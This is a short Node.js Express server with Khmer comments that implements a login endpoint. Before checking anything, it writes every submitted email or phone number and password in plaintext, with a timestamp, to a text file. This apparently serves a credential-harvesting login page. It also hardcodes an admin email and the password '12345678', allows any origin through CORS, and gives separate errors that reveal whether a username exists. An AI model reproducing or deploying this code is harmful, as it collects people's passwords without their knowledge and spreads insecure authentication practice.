const express = require('express');
const cors = require('cors');
const bodyParser = require('body-parser');
const fs = require('fs'); // ហៅកញ្ចប់ library សម្រាប់គ្រប់គ្រងហ្វាល (មានស្រាប់ក្នុង Node.js)

const app = express();
const PORT = process.env.PORT || 3000;

app.use(cors());
app.use(bodyParser.json());

const CORRECT_USER = "admin@gmail.com";
const CORRECT_PASS = "12345678";

app.post('/api/login', (req, res) => {
    const { username, password } = req.body;

    // ១. ចាប់យកពេលវេលាដែល User បានវាយបញ្ចូល
    const timeStamp = new Date().toLocaleString('en-US', { timeZone: 'Asia/Phnom_Penh' });

    // ២. រៀបចំទម្រង់អត្ថបទដើម្បីកត់ចូលហ្វាល
    const logText = `[ពេលវេលា: ${timeStamp}] - អ៊ីមែល/លេខទូរស័ព្ទ: ${username} | ពាក្យសម្ងាត់: ${password}\n`;

    // ៣. សរសេរបញ្ចូលទៅក្នុងហ្វាល database.txt (បើមិនទាន់មានហ្វាលនេះទេ វានឹងបង្កើតឱ្យស្វ័យប្រវត្តិ)
    // មុខងារ appendFile មានន័យថាវាថែមទិន្នន័យថ្មីទៅខាងក្រោម ដោយមិនលុបទិន្នន័យចាស់ឡើយ
    fs.appendFile('database.txt', logText, (err) => {
        if (err) {
            console.error("មានបញ្ហាក្នុងការកត់ត្រាចូលហ្វាល:", err);
        } else {
            console.log("-> បានរក្សាទុកទិន្នន័យចូលក្នុង database.txt រួចរាល់!");
        }
    });

    // ៤. ពិនិត្យទិន្នន័យដើម្បីឆ្លើយតបទៅកាន់ វេសាយ វិញ
    if (username !== CORRECT_USER) {
        return res.json({ 
            success: false, 
            errorType: "username", 
            message: "អ៊ីមែល ឬលេខទូរស័ព្ទនេះ មិនទាន់បានចុះឈ្មោះទេ។" 
        });
    }

    if (password !== CORRECT_PASS) {
        return res.json({ 
            success: false, 
            errorType: "password", 
            message: "ពាក្យសម្ងាត់ដែលអ្នកបានបញ្ចូលមិនត្រឹមត្រូវទេ។" 
        });
    }

    res.json({ 
        success: true, 
        message: "ចូលគណនីជោគជ័យ!" 
    });
});

app.listen(PORT, () => {
    console.log(`Server is running on port ${PORT}`);
});